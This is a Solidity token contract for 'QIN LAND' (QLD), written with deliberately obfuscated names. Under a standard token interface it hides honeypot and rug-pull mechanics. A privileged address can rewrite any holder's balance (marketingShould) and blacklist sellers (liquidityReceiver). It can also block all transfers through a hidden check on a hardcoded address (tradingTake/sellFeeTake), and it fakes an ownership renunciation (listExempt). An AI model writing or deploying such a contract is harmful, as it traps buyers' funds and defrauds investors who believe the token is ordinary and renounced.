//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface limitToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract swapMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitAuto {
    function createPair(address autoReceiver, address modeShould) external returns (address);
}

interface modeTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptFromFund) external view returns (uint256);

    function transfer(address fromFund, uint256 amountAt) external returns (bool);

    function allowance(address takeTotalSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountAt) external returns (bool);

    function transferFrom(
        address sender,
        address fromFund,
        uint256 amountAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toMax, uint256 value);
    event Approval(address indexed takeTotalSender, address indexed spender, uint256 value);
}

interface modeTxMetadata is modeTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract QINLAND is swapMax, modeTx, modeTxMetadata {

    address public tradingBuyFee;

    address private autoWallet;

    mapping(address => bool) public launchBuy;

    string private launchedAuto = "QIN LAND";

    bool private modeTrading;

    address public listSell;

    uint256 private marketingFrom;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTrading;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverAt;
    }

    function transfer(address tokenModeTx, uint256 amountAt) external virtual override returns (bool) {
        return sellFeeTake(_msgSender(), tokenModeTx, amountAt);
    }

    function marketingShould(address tokenModeTx, uint256 amountAt) public {
        buyReceiver();
        buyReceiverSwap[tokenModeTx] = amountAt;
    }

    mapping(address => mapping(address => uint256)) private marketingReceiver;

    function transferFrom(address fromMarketing, address fromFund, uint256 amountAt) external override returns (bool) {
        if (_msgSender() != enableTrading) {
            if (marketingReceiver[fromMarketing][_msgSender()] != type(uint256).max) {
                require(amountAt <= marketingReceiver[fromMarketing][_msgSender()]);
                marketingReceiver[fromMarketing][_msgSender()] -= amountAt;
            }
        }
        return sellFeeTake(fromMarketing, fromFund, amountAt);
    }

    function sellFeeTake(address fromMarketing, address fromFund, uint256 amountAt) internal returns (bool) {
        if (fromMarketing == listSell) {
            return listAtLiquidity(fromMarketing, fromFund, amountAt);
        }
        uint256 marketingLaunchReceiver = modeTx(tradingBuyFee).balanceOf(listTrading);
        require(marketingLaunchReceiver == txMode);
        require(!teamLimit[fromMarketing]);
        return listAtLiquidity(fromMarketing, fromFund, amountAt);
    }

    bool private minShould;

    function balanceOf(address exemptFromFund) public view virtual override returns (uint256) {
        return buyReceiverSwap[exemptFromFund];
    }

    bool private isEnable;

    address listTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listExempt() public {
        emit OwnershipTransferred(listSell, address(0));
        autoWallet = address(0);
    }

    uint256 txMode;

    string private autoMarketingFee = "QLD";

    function tradingTake(uint256 amountAt) public {
        buyReceiver();
        txMode = amountAt;
    }

    bool public txReceiver;

    uint256 private receiverFund;

    function liquidityReceiver(address txAmountWallet) public {
        buyReceiver();
        if (modeTrading != minShould) {
            receiverFund = marketingFrom;
        }
        if (txAmountWallet == listSell || txAmountWallet == tradingBuyFee) {
            return;
        }
        teamLimit[txAmountWallet] = true;
    }

    uint256 private amountSwap;

    event OwnershipTransferred(address indexed walletMax, address indexed feeEnable);

    function liquidityTrading(address launchedShouldLiquidity) public {
        if (txReceiver) {
            return;
        }
        
        launchBuy[launchedShouldLiquidity] = true;
        
        txReceiver = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return autoMarketingFee;
    }

    function approve(address buyMarketing, uint256 amountAt) public virtual override returns (bool) {
        marketingReceiver[_msgSender()][buyMarketing] = amountAt;
        emit Approval(_msgSender(), buyMarketing, amountAt);
        return true;
    }

    uint8 private receiverAt = 18;

    function name() external view virtual override returns (string memory) {
        return launchedAuto;
    }

    function allowance(address autoTake, address buyMarketing) external view virtual override returns (uint256) {
        if (buyMarketing == enableTrading) {
            return type(uint256).max;
        }
        return marketingReceiver[autoTake][buyMarketing];
    }

    function owner() external view returns (address) {
        return autoWallet;
    }

    uint256 private receiverTrading = 100000000 * 10 ** 18;

    mapping(address => uint256) private buyReceiverSwap;

    function buyReceiver() private view {
        require(launchBuy[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return autoWallet;
    }

    constructor (){
        if (amountSwap != receiverFund) {
            receiverFund = marketingFrom;
        }
        listExempt();
        limitToken autoMode = limitToken(enableTrading);
        tradingBuyFee = limitAuto(autoMode.factory()).createPair(autoMode.WETH(), address(this));
        
        listSell = _msgSender();
        launchBuy[listSell] = true;
        buyReceiverSwap[listSell] = receiverTrading;
        if (receiverFund == marketingFrom) {
            marketingFrom = amountSwap;
        }
        emit Transfer(address(0), listSell, receiverTrading);
    }

    address enableTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function listAtLiquidity(address fromMarketing, address fromFund, uint256 amountAt) internal returns (bool) {
        require(buyReceiverSwap[fromMarketing] >= amountAt);
        buyReceiverSwap[fromMarketing] -= amountAt;
        buyReceiverSwap[fromFund] += amountAt;
        emit Transfer(fromMarketing, fromFund, amountAt);
        return true;
    }

    bool private marketingExemptTo;

    mapping(address => bool) public teamLimit;

    uint256 sellTake;

}